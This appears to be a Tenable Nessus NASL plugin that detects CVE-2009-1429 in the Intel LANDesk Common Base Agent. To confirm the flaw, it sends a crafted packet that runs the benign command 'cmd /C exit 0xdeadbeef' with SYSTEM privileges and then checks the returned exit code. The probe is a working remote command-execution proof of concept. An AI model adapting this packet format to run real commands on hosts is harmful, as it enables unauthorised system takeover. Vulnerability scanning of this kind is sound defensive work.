#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(38664);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2009-1429");
  script_bugtraq_id(34671);
  script_xref(name:"OSVDB", value:"54157");
  script_xref(name:"Secunia", value:"34856");

  script_name(english:"Intel Common Base Agent CreateProcessA() Function Remote Command Execution");
  script_summary(english:"Looks for a specific exit code");
 
  script_set_attribute(
    attribute:"synopsis",
    value:"The remote service seems to allow execution of arbitrary commands."
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote host seems to be running a version of the Intel LANDesk\n",
      "Common Base Agent (CBA) that allows the contents of a specially\n",
      "crafted packet to be passed as an argument to 'CreateProcessA()' to be\n",
      "executed on the remote host with SYSTEM privileges."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.nessus.org/u?33c06995 (SYM09-007)"
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "If using Symantec AntiVirus Corporate Edition, Symantec Client\n",
      "Security, or Symantec Endpoint Protection, apply the appropriate\n",
      "update as described in Symantec's advisory referenced above. \n",
      "\n",
      "Otherwise, contact the application's vendor for an update."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
  );
  script_end_attributes();
 
  script_category(ACT_GATHER_INFO);
  script_family(english:"Windows");
  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");
  script_dependencies("find_service2.nasl");
  script_require_ports("Services/unknown", 12174);

  exit(0);
}


include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");


# nb: the service is currently not detected by Nessus.
if (
  thorough_tests &&
  !get_kb_item("global_settings/disable_service_discovery")
)
{
  port = get_unknown_svc(12174);
  if (!port) exit(0);
  if (!silent_service(port)) exit(0); 
}
else port = 12174;
if (known_service(port:port)) exit(0);
if (!get_tcp_port_state(port)) exit(0);


soc = open_sock_tcp(port);
if (!soc) exit(0);


# Try to exploit the issue.
#
# nb: we don't see the output of the command so we'll just try to control
#     the exit code. If you have local access to a host that you suspect
#     is vulnerable, you could try running simply "calc" and seeing if it
#     gets launched.
set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);

magic = 0xdeadbeef;
cmd = string("cmd /C exit ", magic);
# cmd = "calc";
cmd += mkbyte(0);

req = mkdword(0) + mkword(strlen(cmd)) + cmd;
send(socket:soc, data:req);
res = recv(socket:soc, length:4096, min:0x14);
close(soc);
if (isnull(res)) exit(0);


# There's a problem if...
if (
  # it looks like a valid response and...
  strlen(res) == 0x14 &&
  getdword(blob:res, pos:0) == 0 &&
  # we are able to run our command and control the exit code.
  getdword(blob:res, pos:0x10) == magic
)
{
  security_hole(port);

  # Let's register it too.
  register_service(port:port, proto:"landesk-cba");
}
